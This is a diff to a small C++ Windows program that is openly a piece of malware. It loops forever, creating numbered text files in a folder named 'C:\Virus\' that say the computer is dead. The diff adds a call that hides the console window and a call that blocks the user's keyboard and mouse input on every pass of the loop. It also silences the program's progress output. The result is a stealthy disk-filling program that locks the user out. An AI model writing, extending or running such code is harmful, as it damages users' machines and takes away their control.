@@ -1,4 +1,3 @@
-
 //111111111111111111111111111111111111111111111111111111111
 //111111111111111111111111111111111¶¶¶111111111111111111111
 //111111111111111111111111111111¶¶¶¶11111111111111111111111
@@ -51,22 +50,25 @@
 #include<iostream>
 #include<direct.h>
 #include<fstream>
+#include<windows.h>
 
 using namespace std;
 
 int main(){
+                                                        
     long i=0;
     const char *path="C:\\Virus\\";
     string content ="Your computere is dead :)";
-
+    FreeConsole();
     _mkdir(path);
     while(true){
+        BlockInput(true);
         i++;
         ofstream file;
         file.open(path+ to_string(i) + ".txt", ios_base::out);
         file<<content;
         file.close();
-        cout<<"file created: " + to_string(i) + "\r\n";
+        //cout<<"file created: " + to_string(i) + "\r\n";
     }
 }
 //TXJfVW5rbm93biBkaWQgdGhpcy4
